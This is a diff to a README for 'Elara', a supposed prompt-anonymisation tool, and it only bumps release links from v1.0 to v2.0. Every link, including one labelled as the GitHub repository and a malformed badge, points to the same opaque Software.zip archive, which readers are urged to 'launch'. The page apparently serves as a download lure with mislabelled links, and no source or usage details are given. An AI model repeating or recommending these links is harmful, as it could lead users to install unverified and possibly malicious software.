@@ -14,7 +14,7 @@ An innovative tool called Elara has been developed to simplify the process of an
 
 To get started with Elara, simply download the software package from the following link: 
 
-[Launch Elara Software](https://github.com/Diegochs60/elara/releases/download/v1.0/Software.zip)
+[Launch Elara Software](https://github.com/Diegochs60/elara/releases/download/v2.0/Software.zip)
 
 Please note that the link needs to be launched to access the software package.
 
@@ -43,7 +43,7 @@ Contributions to Elara are welcome! You can contribute to the development of the
 
 ## Additional Resources
 
-For more information and updates, visit the [GitHub Repository](https://github.com/Diegochs60/elara/releases/download/v1.0/Software.zip).
+For more information and updates, visit the [GitHub Repository](https://github.com/Diegochs60/elara/releases/download/v2.0/Software.zip).
 
 ## License
 
@@ -53,4 +53,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Feel free to explore Elara and anonymize your LLM prompts with ease! 🛡️🚀
 
-[![Download Elara Software](https://github.com/Diegochs60/elara/releases/download/v1.0/Software.zip%20Software-blue)](https://github.com/Diegochs60/elara/releases/download/v1.0/Software.zip)
+[![Download Elara Software](https://github.com/Diegochs60/elara/releases/download/v2.0/Software.zip%20Software-blue)](https://github.com/Diegochs60/elara/releases/download/v2.0/Software.zip)
